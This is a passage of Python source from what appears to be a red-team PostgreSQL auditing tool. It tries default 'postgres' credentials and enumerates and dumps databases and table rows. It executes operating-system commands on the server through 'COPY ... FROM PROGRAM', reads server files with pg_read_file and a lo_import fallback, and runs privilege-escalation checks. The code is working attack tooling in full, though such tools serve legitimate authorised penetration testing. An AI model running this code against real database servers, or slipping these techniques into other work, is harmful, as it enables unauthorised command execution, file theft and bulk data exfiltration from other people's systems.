        "os_read_attempted": bool(attempted),
        "os_read_ok": ok,
        "os_read_method": method,
        "os_read_output": output,
        "os_read_error": error,
        "os_read_methods": list(attempts or []),
    }


def _pg_try_execute_command(
    sock: socket.socket, command: str, *, max_lines: int = 100
) -> tuple[list[str] | None, str | None]:
    temp_name = f"redposture_exec_{secrets.token_hex(6)}"
    temp_ident = f'"{temp_name}"'

    _, create_error = _pg_query_rows(sock, f"CREATE TEMP TABLE {temp_ident} (line text)")
    if create_error:
        return None, create_error

    _, copy_error = _pg_query_rows(sock, f"COPY {temp_ident} FROM PROGRAM {_pg_quote_literal(command)}")
    if copy_error:
        _pg_query_rows(sock, f"DROP TABLE IF EXISTS {temp_ident}")
        return None, copy_error

    rows, select_error = _pg_query_rows(sock, f"SELECT line FROM {temp_ident} LIMIT {max(1, int(max_lines))}")
    _pg_query_rows(sock, f"DROP TABLE IF EXISTS {temp_ident}")
    if select_error:
        return None, select_error

    lines: list[str] = []
    for row in rows:
        if not row:
            continue
        lines.append(_pg_text(row[0]))
    return lines, None


def _pg_try_query_sql(sock: socket.socket, query: str, *, max_rows: int = 500) -> tuple[list[str] | None, str | None]:
    rows, error = _pg_query_rows(sock, query)
    if error:
        return None, error

    rendered_rows: list[str] = []
    limit = max(1, int(max_rows))
    for row in rows[:limit]:
        if not row:
            rendered_rows.append("")
            continue
        rendered_rows.append(" | ".join("NULL" if value is None else _pg_text(value) for value in row))
    if len(rows) > limit:
        rendered_rows.append(f"<truncated:{len(rows) - limit}>")
    return rendered_rows, None


def _pg_try_read_server_file(
    sock: socket.socket, file_path: str
) -> tuple[list[str] | None, str | None, str | None, list[dict[str, Any]]]:
    """Read a server-side file with pg_read_file, then a large-object fallback."""

    clean_path = str(file_path or "").strip()
    attempts: list[dict[str, Any]] = []
    if not clean_path:
        return None, "empty os-read path", None, attempts

    rows, pg_read_error = _pg_query_rows(sock, f"SELECT pg_read_file({_pg_quote_literal(clean_path)})")
    if pg_read_error:
        attempts.append({"method": "pg_read_file", "ok": False, "error": pg_read_error})
    elif rows and rows[0]:
        content = rows[0][0] or ""
        attempts.append({"method": "pg_read_file", "ok": True, "error": None})
        return content.splitlines(), None, "pg_read_file", attempts
    else:
        attempts.append({"method": "pg_read_file", "ok": False, "error": "empty pg_read_file result"})

    directory = os.path.dirname(clean_path) or "."
    basename = os.path.basename(clean_path)
    _, switch_error = _pg_query_rows(sock, "SELECT pg_switch_wal()")
    dir_rows, dir_error = _pg_query_rows(
        sock,
        f"SELECT pg_ls_dir({_pg_quote_literal(directory)}, FALSE, TRUE)",
    )
    directory_warning: str | None = None
    if dir_error:
        directory_warning = f"pg_ls_dir failed: {dir_error}"
    elif basename and all((row[0] if row else None) != basename for row in dir_rows):
        directory_warning = f"pg_ls_dir did not list {basename}"

    import_rows, import_error = _pg_query_rows(sock, f"SELECT lo_import({_pg_quote_literal(clean_path)})")
    if import_error:
        parts = [f"lo_import failed: {import_error}"]
        if switch_error:
            parts.append(f"pg_switch_wal failed: {switch_error}")
        if directory_warning:
            parts.append(directory_warning)
        error = "; ".join(parts)
        attempts.append({"method": "lo_import", "ok": False, "error": error})
        return None, _pg_read_file_error(attempts), None, attempts

    if not import_rows or not import_rows[0] or not import_rows[0][0]:
        error = "lo_import returned empty oid"
        attempts.append({"method": "lo_import", "ok": False, "error": error})
        return None, _pg_read_file_error(attempts), None, attempts

    raw_oid = str(import_rows[0][0])
    try:
        oid = int(raw_oid)
    except ValueError:
        error = f"lo_import returned invalid oid: {raw_oid}"
        attempts.append({"method": "lo_import", "ok": False, "error": error})
        return None, _pg_read_file_error(attempts), None, attempts

    get_rows, get_error = _pg_query_rows(sock, f"SELECT encode(lo_get({oid}), 'escape')")
    unlink_error: str | None = None
    _, unlink_error = _pg_query_rows(sock, f"SELECT lo_unlink({oid})")
    if get_error:
        parts = [f"lo_get failed: {get_error}"]
        if unlink_error:
            parts.append(f"lo_unlink failed: {unlink_error}")
        attempts.append({"method": "lo_import", "ok": False, "error": "; ".join(parts), "oid": oid})
        return None, _pg_read_file_error(attempts), None, attempts
    if not get_rows or not get_rows[0]:
        attempts.append({"method": "lo_import", "ok": False, "error": "empty lo_get result", "oid": oid})
        return None, _pg_read_file_error(attempts), None, attempts

    content = get_rows[0][0] or ""
    warning_parts = [
        item
        for item in (
            f"pg_switch_wal failed: {switch_error}" if switch_error else None,
            directory_warning,
            f"lo_unlink failed: {unlink_error}" if unlink_error else None,
        )
        if item
    ]
    attempts.append(
        {
            "method": "lo_import",
            "ok": True,
            "error": None,
            "warning": "; ".join(warning_parts) if warning_parts else None,
            "oid": oid,
        }
    )
    return content.splitlines(), None, "lo_import", attempts


def _pg_read_file_error(attempts: list[dict[str, Any]]) -> str:
    parts: list[str] = []
    for attempt in attempts:
        if attempt.get("ok") is True:
            continue
        method = str(attempt.get("method") or "unknown")
        error = str(attempt.get("error") or "failed")
        if error.startswith(f"{method} failed:") or error.startswith(f"{method}:"):
            parts.append(error)
        else:
            parts.append(f"{method} failed: {error}")
    return "; ".join(parts) if parts else "os-read failed"


def _pg_execute_remote_command(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    username: str,
    password: str | None,
    database: str,
    command: str,
) -> tuple[list[str] | None, str | None]:
    attempts = max(1, retries + 1)
    last_error: str | None = None
    for attempt in range(attempts):
        sock: socket.socket | None = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            _pg_startup_and_auth(sock, username=username, password=password, database=database)
            output, exec_error = _pg_try_execute_command(sock, command, max_lines=500)
            try:
                _pg_send_terminate(sock)
            except Exception:
                pass
            return output, exec_error
        except _PgAuditError as exc:
            return None, str(exc)
        except (OSError, ValueError, ConnectionError) as exc:
            last_error = str(exc)
            if attempt >= attempts - 1:
                break
            time.sleep(_retry_delay(attempt))
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
    return None, last_error or "connection failed"


def _pg_execute_sql_query(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    username: str,
    password: str | None,
    database: str,
    query: str,
) -> tuple[list[str] | None, str | None]:
    attempts = max(1, retries + 1)
    last_error: str | None = None
    for attempt in range(attempts):
        sock: socket.socket | None = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            _pg_startup_and_auth(sock, username=username, password=password, database=database)
            output, query_error = _pg_try_query_sql(sock, query, max_rows=500)
            try:
                _pg_send_terminate(sock)
            except Exception:
                pass
            return output, query_error
        except _PgAuditError as exc:
            return None, str(exc)
        except (OSError, ValueError, ConnectionError) as exc:
            last_error = str(exc)
            if attempt >= attempts - 1:
                break
            time.sleep(_retry_delay(attempt))
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
    return None, last_error or "connection failed"


def _pg_query_table_rows(
    sock: socket.socket,
    table_name: str,
    *,
    columns: list[str] | None = None,
    max_rows: int | None = None,
) -> tuple[str, list[str] | None, str | None]:
    sql_ident, display_name, normalize_error = _pg_normalize_table_name(table_name)
    if normalize_error or sql_ident is None or display_name is None:
        return (table_name or "").strip() or "<invalid>", None, normalize_error or "invalid table name"

    if columns:
        select_list = ", ".join(_pg_quote_ident(column) for column in columns)
    else:
        select_list = "*"
    limit_clause = ""
    if max_rows is not None:
        limit_clause = f" LIMIT {max(1, int(max_rows))}"
    rows, error = _pg_query_rows(
        sock,
        f"SELECT row_to_json(t)::text FROM (SELECT {select_list} FROM {sql_ident}{limit_clause}) AS t",
    )
    if error:
        return display_name, None, error

    values: list[str] = []
    for row in rows:
        if not row:
            continue
        values.append(_pg_text(row[0]))
    return display_name, values, None


def _pg_query_table_row_count(
    sock: socket.socket,
    table_name: str,
) -> tuple[str, int | None, str | None]:
    sql_ident, display_name, normalize_error = _pg_normalize_table_name(table_name)
    if normalize_error or sql_ident is None or display_name is None:
        return (table_name or "").strip() or "<invalid>", None, normalize_error or "invalid table name"

    count_value, error = _pg_query_scalar_int(sock, f"SELECT COUNT(*) FROM {sql_ident}")
    if error:
        return display_name, None, error
    return display_name, count_value, None


def _pg_query_table_columns(
    sock: socket.socket,
    table_name: str,
    *,
    only_columns: list[str] | None = None,
) -> tuple[str, list[str] | None, str | None]:
    _, display_name, normalize_error = _pg_normalize_table_name(table_name)
    if normalize_error or display_name is None:
        return (table_name or "").strip() or "<invalid>", None, normalize_error or "invalid table name"

    rows, error = _pg_query_rows(
        sock,
        (
            "SELECT a.attname "
            "FROM pg_attribute a "
            f"WHERE a.attrelid = to_regclass({_pg_quote_literal(display_name)}) "
            "AND a.attnum > 0 "
            "AND NOT a.attisdropped "
            "ORDER BY a.attnum"
        ),
    )
    if error:
        return display_name, None, error

    columns: list[str] = []
    for row in rows:
        if not row:
            continue
        value = str(row[0] or "").strip()
        if value:
            columns.append(value)
    if not columns:
        return display_name, None, "table not found or no visible columns"

    if only_columns:
        selected = set(only_columns)
        columns = [column for column in columns if column in selected]
        if not columns:
            return display_name, None, "no matching columns"

    return display_name, columns, None


def _merge_query_error(current: str | None, new_error: str | None) -> str | None:
    if not new_error:
        return current
    if not current:
        return new_error
    return f"{current}; {new_error}"


def _pg_display_table_name(database_name: str | None, table_name: str) -> str:
    clean_database = str(database_name or "").strip()
    clean_table = str(table_name or "").strip()
    if clean_database and clean_table:
        return f"{clean_database}.{clean_table}"
    return clean_table or "<unknown>"


def _pg_collect_database_artifacts(
    sock: socket.socket,
    *,
    database_name: str,
    include_database_prefix: bool,
    show_tables: bool,
    show_row_counts: bool,
    show_columns: bool,
    table_targets: list[str],
    table_columns: list[str],
    dump_table_rows: bool,
    dump_row_limit: int | None,
) -> tuple[list[str] | None, list[dict[str, Any]], list[dict[str, Any]], list[dict[str, Any]], int | None, str | None]:
    query_error: str | None = None
    raw_table_names: list[str] | None = None
    table_names: list[str] | None = None

    if show_tables or show_row_counts or (dump_table_rows and not table_targets):
        raw_table_names, table_error = _pg_query_readable_tables(sock)
        query_error = _merge_query_error(query_error, table_error)
        if show_tables and isinstance(raw_table_names, list):
            if include_database_prefix:
                table_names = [_pg_display_table_name(database_name, table_name) for table_name in raw_table_names]
            else:
                table_names = [str(table_name) for table_name in raw_table_names]

    readable_tables = len(raw_table_names) if isinstance(raw_table_names, list) else None
    table_columns_info: list[dict[str, Any]] = []
    table_row_counts: list[dict[str, Any]] = []
    table_dumps: list[dict[str, Any]] = []
    dump_targets: list[str] = table_targets if table_targets else (raw_table_names or [])
    table_columns_map: dict[str, list[str]] = {}
    row_count_targets: list[str] = table_targets if table_targets else (raw_table_names or [])

    should_collect_table_columns = bool(table_targets) and (show_columns or not dump_table_rows)
    if should_collect_table_columns:
        for table_name in table_targets:
            columns_table, columns_rows, columns_error = _pg_query_table_columns(
                sock,
                table_name,
                only_columns=table_columns if table_columns else None,
            )
            display_table = (
                _pg_display_table_name(database_name, str(columns_table))
                if include_database_prefix
                else str(columns_table)
            )
            table_columns_info.append(
                {
                    "database": database_name,
                    "table": display_table,
                    "columns": columns_rows,
                    "error": columns_error,
                }
            )
            if isinstance(columns_rows, list) and columns_rows:
                normalized_columns = [str(column) for column in columns_rows]
                table_columns_map[table_name] = normalized_columns
                table_columns_map[str(columns_table)] = normalized_columns

    if show_row_counts:
        for table_name in row_count_targets:
            count_table, row_count, row_count_error = _pg_query_table_row_count(sock, table_name)
            table_row_counts.append(
                {
                    "database": database_name,
                    "table": (
                        _pg_display_table_name(database_name, str(count_table))
                        if include_database_prefix
                        else str(count_table)
                    ),
                    "row_count": row_count,
                    "error": row_count_error,
                }
            )

    if dump_table_rows:
        selected_dump_columns = [str(column) for column in table_columns] if table_columns else None
        for table_name in dump_targets:
            dump_columns = selected_dump_columns
            if not dump_columns:
                cached_columns = table_columns_map.get(table_name)
                if cached_columns:
                    dump_columns = list(cached_columns)
                else:
                    columns_table, columns_rows, columns_error = _pg_query_table_columns(sock, table_name)
                    if columns_error:
                        query_error = _merge_query_error(query_error, columns_error)
                    if isinstance(columns_rows, list) and columns_rows:
                        dump_columns = [str(column) for column in columns_rows]
                        table_columns_map[table_name] = list(dump_columns)
                        table_columns_map[str(columns_table)] = list(dump_columns)
            dump_table, dump_rows, dump_error = _pg_query_table_rows(
                sock,
                table_name,
                columns=table_columns if table_columns else None,
                max_rows=dump_row_limit,
            )
            table_dumps.append(
                {
                    "database": database_name,
                    "table": (
                        _pg_display_table_name(database_name, str(dump_table))
                        if include_database_prefix
                        else str(dump_table)
                    ),
                    "columns": dump_columns,
                    "rows": dump_rows,
                    "error": dump_error,
                }
            )

    return table_names, table_columns_info, table_row_counts, table_dumps, readable_tables, query_error


def _pg_collect_database_artifacts_remote(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    username: str,
    password: str | None,
    database_name: str,
    *,
    include_database_prefix: bool,
    show_tables: bool,
    show_row_counts: bool,
    show_columns: bool,
    table_targets: list[str],
    table_columns: list[str],
    dump_table_rows: bool,
    dump_row_limit: int | None,
) -> tuple[list[str] | None, list[dict[str, Any]], list[dict[str, Any]], list[dict[str, Any]], int | None, str | None]:
    attempts = max(1, retries + 1)
    last_error: str | None = None
    for attempt in range(attempts):
        sock: socket.socket | None = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            _pg_startup_and_auth(sock, username=username, password=password, database=database_name)
            result = _pg_collect_database_artifacts(
                sock,
                database_name=database_name,
                include_database_prefix=include_database_prefix,
                show_tables=show_tables,
                show_row_counts=show_row_counts,
                show_columns=show_columns,
                table_targets=table_targets,
                table_columns=table_columns,
                dump_table_rows=dump_table_rows,
                dump_row_limit=dump_row_limit,
            )
            try:
                _pg_send_terminate(sock)
            except Exception:
                pass
            return result
        except _PgAuditError as exc:
            return None, [], [], [], None, str(exc)
        except (OSError, ValueError, ConnectionError) as exc:
            last_error = str(exc)
            if attempt >= attempts - 1:
                break
            time.sleep(_retry_delay(attempt))
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
    return None, [], [], [], None, last_error or "connection failed"


def _audit_postgres_host(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    username: str | None,
    password: str | None,
    defcreds: bool,
    database: str | None,
    show_databases: bool,
    show_tables: bool,
    show_row_counts: bool,
    show_columns: bool,
    table_targets: list[str],
    table_targets_by_database: dict[str | None, list[str]],
    table_columns: list[str],
    dump_table_rows: bool,
    dump_row_limit: int | None,
    execute_command: str | None,
    sql_command: str | None,
    os_read_path: str | None = None,
    privesc_check: bool = False,
    show_databases_limit: int | None = None,
    show_tables_limit: int | None = None,
    show_columns_limit: int | None = None,
) -> dict[str, Any]:
    attempts = max(1, retries + 1)
    last_error: str | None = None
    show_tables_requested = bool(show_tables)
    show_row_counts_requested = bool(show_row_counts)
    effective_show_tables = show_tables_requested or show_row_counts_requested
    effective_show_row_counts = show_row_counts_requested or show_tables_requested

    provided_credentials = (password is not None or username is not None) and not defcreds
    if provided_credentials:
        effective_username = (username or "postgres").strip() or "postgres"
        effective_password = password
    elif defcreds:
        effective_username = (username or "postgres").strip() or "postgres"
        effective_password = password if password is not None else "postgres"
    else:
        effective_username = "postgres"
        effective_password = None

    for attempt in range(attempts):
        started = time.monotonic()
        try:
            with socket.create_connection((host, port), timeout=timeout) as sock:
                sock.settimeout(timeout)

                target_database = str(database or "").strip() or None
                startup_database = target_database or "postgres"
                effective_table_targets_by_database = dict(table_targets_by_database)
                if table_targets and not effective_table_targets_by_database:
                    effective_table_targets_by_database = {target_database: list(table_targets)}

                session = _pg_startup_and_auth(
                    sock,
                    username=effective_username,
                    password=effective_password,
                    database=startup_database,
                )

                superuser, can_execute_commands, can_read_tables, readable_tables, query_error = (
                    _collect_postgres_privileges(sock)
                )
                database_names_all, databases_error = _pg_query_databases(sock)
                accessible_database_names: list[str] | None = None
                accessible_databases_error: str | None = None
                database_count = len(database_names_all) if isinstance(database_names_all, list) else None
                database_names = database_names_all if show_databases and isinstance(database_names_all, list) else None
                if show_databases and databases_error:
                    query_error = _merge_query_error(query_error, databases_error)

                inspect_all_databases = (
                    target_database is None and not table_targets and (effective_show_tables or dump_table_rows)
                )
                if inspect_all_databases:
                    accessible_database_names, accessible_databases_error = _pg_query_accessible_databases(sock)
                prefixed_target_databases = [key for key in effective_table_targets_by_database if key]
                if prefixed_target_databases:
                    inspection_databases = list(prefixed_target_databases)
                    if None in effective_table_targets_by_database:
                        inspection_databases.insert(0, startup_database)
                elif (
                    inspect_all_databases and isinstance(accessible_database_names, list) and accessible_database_names
                ):
                    inspection_databases = list(accessible_database_names)
                    if startup_database not in inspection_databases:
                        inspection_databases.insert(0, startup_database)
                elif inspect_all_databases:
                    inspection_databases = [startup_database]
                    if accessible_databases_error:
                        query_error = _merge_query_error(query_error, accessible_databases_error)
                else:
                    inspection_databases = [str(target_database or startup_database)]

                deduped_inspection_databases: list[str] = []
                seen_inspection_databases: set[str] = set()
                for database_name in inspection_databases:
                    candidate = str(database_name or "").strip()
                    if not candidate or candidate in seen_inspection_databases:
                        continue
                    seen_inspection_databases.add(candidate)
                    deduped_inspection_databases.append(candidate)
                inspection_databases = deduped_inspection_databases or [startup_database]
                include_database_prefix = len(inspection_databases) > 1

                table_names: list[str] | None = None
                table_columns_info: list[dict[str, Any]] = []
                table_row_counts: list[dict[str, Any]] = []
                table_dumps: list[dict[str, Any]] = []
                aggregated_readable_tables = 0
                aggregated_readable_known = False
                used_current_session = False

                for inspection_database in inspection_databases:
                    database_table_targets = list(effective_table_targets_by_database.get(inspection_database, []))
                    if inspection_database == startup_database:
                        for local_table_target in effective_table_targets_by_database.get(None, []):
                            if local_table_target not in database_table_targets:
                                database_table_targets.append(local_table_target)
                    if inspection_database == startup_database and not used_current_session:
                        (
                            database_table_names,
                            database_columns_info,
                            database_table_row_counts,
                            database_table_dumps,
                            database_readable_tables,
                            database_query_error,
                        ) = _pg_collect_database_artifacts(
                            sock,
                            database_name=inspection_database,
                            include_database_prefix=include_database_prefix,
                            show_tables=effective_show_tables,
                            show_row_counts=effective_show_row_counts,
                            show_columns=show_columns,
                            table_targets=database_table_targets,
                            table_columns=table_columns,
                            dump_table_rows=dump_table_rows,
                            dump_row_limit=dump_row_limit,
                        )
                        used_current_session = True
                    else:
                        (
                            database_table_names,
                            database_columns_info,
                            database_table_row_counts,
                            database_table_dumps,
                            database_readable_tables,
                            database_query_error,
                        ) = _pg_collect_database_artifacts_remote(
                            host,
                            port,
                            timeout,
                            retries,
                            effective_username,
                            effective_password,
                            inspection_database,
                            include_database_prefix=include_database_prefix,
                            show_tables=effective_show_tables,
                            show_row_counts=effective_show_row_counts,
                            show_columns=show_columns,
                            table_targets=database_table_targets,
                            table_columns=table_columns,
                            dump_table_rows=dump_table_rows,
                            dump_row_limit=dump_row_limit,
                        )

                    query_error = _merge_query_error(query_error, database_query_error)
                    if isinstance(database_table_names, list):
                        if table_names is None:
                            table_names = []
                        table_names.extend(database_table_names)
                    if isinstance(database_columns_info, list) and database_columns_info:
                        table_columns_info.extend(database_columns_info)
                    if isinstance(database_table_row_counts, list) and database_table_row_counts:
                        table_row_counts.extend(database_table_row_counts)
                    if isinstance(database_table_dumps, list) and database_table_dumps:
                        table_dumps.extend(database_table_dumps)
                    if isinstance(database_readable_tables, int):
                        aggregated_readable_tables += database_readable_tables
                        aggregated_readable_known = True

                if aggregated_readable_known:
                    readable_tables = aggregated_readable_tables
                    can_read_tables = aggregated_readable_tables > 0

                dump_targets = (
                    [str(item.get("table") or "") for item in table_dumps] if dump_table_rows else table_targets
                )

                execute_attempted = False
                execute_ok: bool | None = None
                execute_output: list[str] | None = None
                execute_error: str | None = None
                if execute_command:
                    execute_attempted = True
                    execute_output, execute_error = _pg_try_execute_command(sock, execute_command)
                    execute_ok = execute_error is None

                sql_attempted = False
                sql_ok: bool | None = None
                sql_output: list[str] | None = None
                sql_error: str | None = None
                if sql_command:
                    sql_attempted = True
                    sql_output, sql_error = _pg_try_query_sql(sock, sql_command, max_rows=500)
                    sql_ok = sql_error is None

                os_read_attempted = False
                os_read_ok: bool | None = None
                os_read_output: list[str] | None = None
                os_read_error: str | None = None
                os_read_method: str | None = None
                os_read_methods: list[dict[str, Any]] = []
                if os_read_path:
                    os_read_attempted = True
                    os_read_output, os_read_error, os_read_method, os_read_methods = _pg_try_read_server_file(
                        sock,
                        os_read_path,
                    )
                    os_read_ok = os_read_error is None

                privesc_checks: list[dict[str, Any]] = []
                privesc_summary: dict[str, int] = {}
                if privesc_check:
                    privesc_checks, privesc_summary = _pg_collect_privesc_checks(sock, superuser)

                try:
                    _pg_send_terminate(sock)
                except Exception:
                    pass

                if session.auth_required is False and defcreds:
                    status = "weak_default_creds"
                elif session.auth_required is False:
                    status = "open_no_auth"
                elif provided_credentials:
                    status = "valid_credentials"
                elif defcreds:
                    status = "weak_default_creds"
                else:
                    status = "auth_required"

                return {
                    "timestamp": utc_now_iso(),
                    "host": host,
                    "port": port,
                    "database": target_database or startup_database,
                    "auth_database": startup_database,
                    "is_postgres": True,
                    "status": status,
                    "auth_required": session.auth_required,
                    "auth_method": session.auth_method,
                    "provided_credentials": provided_credentials,
                    "provided_username": username,
                    "provided_password": password if provided_credentials else None,
                    "defcreds_enabled": defcreds,
                    "effective_username": effective_username,
                    "show_databases": show_databases,
                    "show_databases_limit": show_databases_limit,
                    "database_names": database_names,
                    "database_count": database_count,
                    "show_tables": effective_show_tables,
                    "show_tables_limit": show_tables_limit,
                    "show_row_counts": show_row_counts_requested,
                    "show_columns": show_columns,
                    "show_columns_limit": show_columns_limit,
                    "table_names": table_names,
                    "table_targets": dump_targets if dump_table_rows and not table_targets else table_targets,
                    "table_columns": table_columns,
                    "table_row_counts": table_row_counts,
                    "table_dump_enabled": dump_table_rows,
                    "dump_row_limit": dump_row_limit,
                    "table_columns_info": table_columns_info,
                    "table_dumps": table_dumps,
                    "execute_command": execute_command,
                    "execute_attempted": execute_attempted,
                    "execute_ok": execute_ok,
                    "execute_output": execute_output,
                    "execute_error": execute_error,
                    "sql_command": sql_command,
                    "sql_attempted": sql_attempted,
                    "sql_ok": sql_ok,
                    "sql_output": sql_output,
                    "sql_error": sql_error,
                    **_pg_os_read_record_fields(
                        os_read_path,
                        attempted=os_read_attempted,
                        ok=os_read_ok,
                        method=os_read_method,
                        output=os_read_output,
                        error=os_read_error,
                        attempts=os_read_methods,
                    ),
                    "privesc_check": privesc_check,
                    "privesc_checks": privesc_checks,
                    "privesc_summary": privesc_summary,
                    "server_version": session.server_version,
                    "superuser": superuser,
                    "can_execute_commands": can_execute_commands,
                    "can_read_tables": can_read_tables,
                    "readable_tables": readable_tables,
                    "elapsed_ms": int((time.monotonic() - started) * 1000),
                    "error": query_error,
                }

        except _PgAuditError as exc:
            target_database = str(database or "").strip() or None
            startup_database = target_database or "postgres"
            return {
                "timestamp": utc_now_iso(),
                "host": host,
                "port": port,
                "database": target_database or startup_database,
                "auth_database": startup_database,
                "is_postgres": bool(exc.detected),
                "status": "auth_required" if exc.detected and exc.auth_required else "fail",
                "auth_required": exc.auth_required,
                "auth_method": exc.auth_method,
                "provided_credentials": provided_credentials,
                "provided_username": username,
                "provided_password": password if provided_credentials else None,
                "defcreds_enabled": defcreds,
                "effective_username": effective_username,
                "show_databases": show_databases,
                "database_names": None,
                "database_count": None,
                "show_tables": effective_show_tables,
                "show_row_counts": show_row_counts_requested,
                "show_columns": show_columns,
                "table_names": None,
                "table_targets": table_targets,
                "table_columns": table_columns,
                "table_row_counts": [],
                "table_dump_enabled": dump_table_rows,
                "dump_row_limit": dump_row_limit,
                "table_columns_info": [],
                "table_dumps": [],
                "execute_command": execute_command,
                "execute_attempted": False,
                "execute_ok": None,
                "execute_output": None,
                "execute_error": None,
                "sql_command": sql_command,
                "sql_attempted": False,
                "sql_ok": None,
                "sql_output": None,
                "sql_error": None,
                **_pg_os_read_record_fields(os_read_path),
                "privesc_check": privesc_check,
                "privesc_checks": [],
                "privesc_summary": {},
                "server_version": None,
                "superuser": None,
                "can_execute_commands": None,
                "can_read_tables": None,
                "readable_tables": None,
                "elapsed_ms": int((time.monotonic() - started) * 1000),
                "error": str(exc),
            }

        except (OSError, ValueError, ConnectionError) as exc:
            last_error = str(exc)
            if attempt >= attempts - 1:
                break
            time.sleep(_retry_delay(attempt))

    return {
        "timestamp": utc_now_iso(),
        "host": host,
        "port": port,
        "database": (str(database or "").strip() or None) or "postgres",
        "auth_database": (str(database or "").strip() or None) or "postgres",
        "is_postgres": False,
        "status": "fail",
        "auth_required": None,
        "auth_method": None,
        "provided_credentials": provided_credentials,
        "provided_username": username,
        "provided_password": password if provided_credentials else None,
        "defcreds_enabled": defcreds,
        "effective_username": effective_username,
        "show_databases": show_databases,
        "show_databases_limit": show_databases_limit,
        "database_names": None,
        "database_count": None,
        "show_tables": effective_show_tables,
        "show_tables_limit": show_tables_limit,
        "show_row_counts": show_row_counts_requested,
        "show_columns": show_columns,
        "show_columns_limit": show_columns_limit,
        "table_names": None,
        "table_targets": table_targets,
        "table_columns": table_columns,
        "table_row_counts": [],
        "table_dump_enabled": dump_table_rows,
        "dump_row_limit": dump_row_limit,
        "table_columns_info": [],
        "table_dumps": [],
        "execute_command": execute_command,
        "execute_attempted": False,
        "execute_ok": None,
        "execute_output": None,
        "execute_error": None,
        "sql_command": sql_command,
        "sql_attempted": False,
        "sql_ok": None,
        "sql_output": None,
        "sql_error": None,
        **_pg_os_read_record_fields(os_read_path),
        "privesc_check": privesc_check,
        "privesc_checks": [],
        "privesc_summary": {},
        "server_version": None,
        "superuser": None,
        "can_execute_commands": None,
        "can_read_tables": None,
        "readable_tables": None,
        "elapsed_ms": None,
        "error": last_error or "connection failed",
    }


def _nxc_prefix(record: dict[str, Any]) -> str:
    host = _clip(str(record.get("host") or "-"), 64)
    port = str(record.get("port") or "-")
    return f"{'POSTGRES':<8}\t{host}\t{port}\t"


def _caps_suffix(record: dict[str, Any]) -> str:
    superuser = record.get("superuser")
    can_execute_commands = record.get("can_execute_commands")
    can_read_tables = record.get("can_read_tables")
    database_count = record.get("database_count")
    database_names = record.get("database_names")

    superuser_text = "True" if superuser is True else "False" if superuser is False else "unknown"
    execute_text = "True" if can_execute_commands is True else "False" if can_execute_commands is False else "unknown"
    read_tables_text = "True" if can_read_tables is True else "False" if can_read_tables is False else "unknown"
    if isinstance(database_count, int):
        databases_text = str(database_count)
    elif isinstance(database_names, list):
        databases_text = str(len(database_names))
    else:
        databases_text = "-"

    return " ".join(
        (
            f"(superuser:{superuser_text})",
            f"(execute:{execute_text})",
            f"(read:{read_tables_text})",
            f"(DBs:{databases_text})",
        )
    )


def _format_detect_record(record: dict[str, Any], output_format: str) -> str:
    auth_required = record.get("auth_required")
    auth_required_text = "True" if auth_required is True else "False" if auth_required is False else "unknown"

    if output_format == "json":
        return json.dumps(
            {
                "timestamp": record.get("timestamp"),
                "type": "detect",
                "host": record.get("host"),
                "port": record.get("port"),
                "service": "postgres",
                "detected": bool(record.get("is_postgres")),
                "auth_required": auth_required,
                "auth_method": record.get("auth_method"),
            },
            ensure_ascii=False,
        )

    return f"{_nxc_prefix(record)} [*] Postgres Database (auth required:{auth_required_text})"


def _format_tables_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    if not record.get("show_tables"):
        return []

    table_names = record.get("table_names")
    if not isinstance(table_names, list):
        return []
    raw_limit = record.get("show_tables_limit")
    limit = raw_limit if isinstance(raw_limit, int) and not isinstance(raw_limit, bool) else None
    table_meta = limit_metadata(table_names, limit)
    displayed_table_names = limit_sequence(table_names, limit)

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "tables_dump",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "table_count": len(table_names),
                    "tables": [str(item) for item in displayed_table_names],
                    "tables_shown": table_meta["shown"],
                    "tables_limit": table_meta["limit"],
                    "tables_truncated": table_meta["truncated"],
                },
                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    row_counts_by_table: dict[str, dict[str, Any]] = {}
    table_row_counts = record.get("table_row_counts")
    if isinstance(table_row_counts, list):
        for item in table_row_counts:
            if not isinstance(item, dict):
                continue
            table_name = str(item.get("table") or "").strip()
            if table_name and table_name not in row_counts_by_table:
                row_counts_by_table[table_name] = item
    if limit is not None and len(table_names) > len(displayed_table_names):
        lines = [f"{prefix} [*] Dump Tables (showing:{len(displayed_table_names)} of {len(table_names)})"]
    else:
        lines = [f"{prefix} [*] Dump Tables"]
    for table_name in displayed_table_names:
        rendered_name = str(table_name)
        row_item = row_counts_by_table.get(rendered_name)
        if row_item is None:
            lines.append(f"{prefix} {rendered_name}")
            continue
        row_error = row_item.get("error")
        if row_error:
            lines.append(f"{prefix} {rendered_name} <error:{_pg_text(row_error)}>")
            continue
        row_count = row_item.get("row_count")
        row_count_text = str(row_count) if isinstance(row_count, int) else "unknown"
        lines.append(f"{prefix} {rendered_name} (Rows:{row_count_text})")
    return lines


def _format_databases_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    if not record.get("show_databases"):
        return []

    database_names = record.get("database_names")
    if not isinstance(database_names, list):
        return []
    raw_limit = record.get("show_databases_limit")
    limit = raw_limit if isinstance(raw_limit, int) and not isinstance(raw_limit, bool) else None
    database_meta = limit_metadata(database_names, limit)
    displayed_database_names = limit_sequence(database_names, limit)

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "databases_dump",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "database_count": len(database_names),
                    "databases": [str(item) for item in displayed_database_names],
                    "databases_shown": database_meta["shown"],
                    "databases_limit": database_meta["limit"],
                    "databases_truncated": database_meta["truncated"],
                },
